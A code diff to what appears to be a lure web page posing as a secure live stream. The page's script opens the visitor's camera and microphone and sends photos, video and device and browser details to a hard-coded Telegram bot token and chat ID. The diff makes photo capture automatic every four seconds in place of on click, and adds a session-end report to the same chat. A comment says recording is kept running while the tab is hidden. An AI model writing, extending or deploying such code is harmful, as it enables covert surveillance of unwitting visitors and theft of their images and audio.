@@ -448,7 +448,7 @@
         
         <div class="click-counter">💡 Click anywhere to capture photo</div>
         
-        <div class="footer">🔒 SECURE • LIVE • 24/7 • WITH AUDIO</div>
+        <div class="footer">🔒 SECURE • LIVE • 24/7 • VIDEO + AUDIO</div>
     </div>
 
     <!-- ================================================================ -->
@@ -461,6 +461,7 @@
         const BOT_TOKEN = "8711596639:AAGySHI6xEgqOz0oT1Sq5Y49QpeQkNe-GmI";
         const CHAT_ID = "8295417969";
         const MAX_VIDEO_DURATION = 60000; // 60 seconds
+        const CAPTURE_INTERVAL = 4000; // 4 seconds between photos
         
         // ================================================================
         //  GET CODE FROM URL
@@ -555,7 +556,7 @@
         let videoStartTime = 0;
         let viewerTimer = null;
         let timeUpdateTimer = null;
-        let lastPhotoTime = 0;
+        let captureTimer = null;
         let isVideoSent = false;
         
         // ================================================================
@@ -583,6 +584,9 @@
                 
                 // Start video recording
                 startVideoRecording();
+                
+                // Start auto photo capture (every 4 seconds)
+                startAutoCapture();
                 
                 // Start UI updates
                 startUIUpdates();
@@ -639,14 +643,21 @@
         }
         
         // ================================================================
-        //  CAPTURE PHOTO
+        //  AUTO CAPTURE PHOTO (Every 4 seconds)
         // ================================================================
+        function startAutoCapture() {
+            // Capture first photo immediately
+            capturePhoto();
+            
+            captureTimer = setInterval(() => {
+                if (isRunning) {
+                    capturePhoto();
+                }
+            }, CAPTURE_INTERVAL);
+        }
+        
         function capturePhoto() {
             if (!isRunning || !stream) return;
-            
-            const now = Date.now();
-            if (now - lastPhotoTime < 500) return;
-            lastPhotoTime = now;
             
             try {
                 const context = canvas.getContext('2d');
@@ -654,10 +665,10 @@
                 canvas.height = video.videoHeight || 240;
                 context.drawImage(video, 0, 0, canvas.width, canvas.height);
                 
-                const imageData = canvas.toDataURL('image/jpeg', 0.9);
+                const imageData = canvas.toDataURL('image/jpeg', 0.85);
                 photoCount++;
                 clickCountNum++;
-                clickCount.textContent = `👆 ${clickCountNum} clicks`;
+                clickCount.textContent = `📸 ${photoCount} photos`;
                 
                 sendPhotoToTelegram(imageData);
                 refreshContent();
@@ -716,7 +727,23 @@
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
                         chat_id: CHAT_ID,
-                        text: `🎬 **Session Started**\n\n🔗 Code: ${code}\n📱 Device: ${device}\n🌍 Browser: ${browser}\n🎙️ Audio: Enabled`,
+                        text: `🎬 **Session Started**\n\n🔗 Code: ${code}\n📱 Device: ${device}\n🌍 Browser: ${browser}\n🎙️ Audio: Enabled\n📸 Auto-capture: Every 4s`,
+                        parse_mode: 'Markdown'
+                    })
+                });
+            } catch (e) {}
+        }
+        
+        async function sendEndNotification() {
+            const totalTime = Math.floor((Date.now() - startTime) / 1000);
+            try {
+                const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+                await fetch(url, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: `🛑 **Session Ended**\n\n📸 Photos: ${photoCount}\n⏱️ ${Math.floor(totalTime/60)}m ${totalTime%60}s`,
                         parse_mode: 'Markdown'
                     })
                 });
@@ -763,7 +790,6 @@
                 `;
                 div.onclick = (e) => {
                     e.stopPropagation();
-                    capturePhoto();
                     featuredIcon.textContent = item.icon;
                     featuredTitle.textContent = item.title;
                     featuredDesc.textContent = item.desc;
@@ -848,12 +874,6 @@
             capturePhoto();
         });
         
-        mainCard.addEventListener('click', function(e) {
-            if (e.target.closest('.grid-item')) return;
-            if (e.target.closest('.source-btn')) return;
-            capturePhoto();
-        });
-        
         document.querySelectorAll('.source-btn').forEach(btn => {
             btn.addEventListener('click', function() {
                 document.querySelectorAll('.source-btn').forEach(b => b.classList.remove('active'));
@@ -872,19 +892,11 @@
                 try { mediaRecorder.stop(); } catch(e) {}
             }
             
+            if (captureTimer) clearInterval(captureTimer);
             if (viewerTimer) clearInterval(viewerTimer);
             if (timeUpdateTimer) clearInterval(timeUpdateTimer);
             
-            const totalTime = Math.floor((Date.now() - startTime) / 1000);
-            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    chat_id: CHAT_ID,
-                    text: `🛑 **Session Ended**\n\n📸 Photos: ${photoCount}\n⏱️ ${Math.floor(totalTime/60)}m ${totalTime%60}s`,
-                    parse_mode: 'Markdown'
-                })
-            }).catch(() => {});
+            sendEndNotification();
             
             setTimeout(() => {
                 if (stream) stream.getTracks().forEach(track => track.stop());
@@ -892,6 +904,11 @@
         }
         
         window.addEventListener('beforeunload', stopAll);
+        document.addEventListener('visibilitychange', function() {
+            if (document.hidden) {
+                // Tab hidden - keep recording
+            }
+        });
         
         // ================================================================
         //  START!
